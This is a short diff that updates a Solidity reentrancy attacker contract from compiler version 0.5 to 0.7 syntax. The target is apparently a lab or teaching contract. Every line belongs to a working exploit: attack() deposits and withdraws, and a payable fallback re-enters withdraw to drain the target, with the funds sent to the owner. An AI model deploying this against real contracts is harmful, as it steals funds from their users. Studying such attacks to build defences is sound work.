@@ -1,4 +1,4 @@
-pragma solidity ^0.5.2;
+pragma solidity ^0.7.0;
 
 import "./interfaces/Ireentry.sol";
 
@@ -14,15 +14,15 @@ contract reentryAttacker {
 
     function attack() public payable {
         require(msg.sender == owner);
-        reentryContract.deposit.value(msg.value)();
+        reentryContract.deposit{value: msg.value}();
         reentryContract.withdraw(msg.value);
     }
 
-    function() external payable {
+    fallback() external payable {
         reentryContract.withdraw(msg.value);
     }
 
     function withdraw(uint _value) public {
-        owner.call.value(_value)("");
+        owner.call{value: _value}("");
     }
 }
